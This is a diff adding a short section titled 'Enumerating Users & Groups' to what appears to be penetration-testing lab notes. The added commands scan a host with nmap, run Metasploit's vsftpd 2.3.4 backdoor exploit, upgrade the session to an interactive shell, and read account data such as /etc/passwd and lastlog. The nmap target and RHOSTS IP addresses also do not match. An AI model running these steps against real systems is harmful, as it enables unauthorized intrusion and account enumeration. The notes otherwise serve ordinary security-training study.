@@ -1911,9 +1911,29 @@ uname -a
 lscpu
 df -h
 ```
+99) Enumerating Users & Groups
 
-
-
+```
+ifconfig
+nmap -sV 192.72.78.3
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.72.28.3
+exploit
+/bin/bash -i
+CTRL + Z
+sessions -u 1
+sessions 2
+getuid
+shell
+/bin/bash -i
+whoami
+groups root
+cat /etc/passwd
+groups
+who
+lastlog
+```
 
 
 
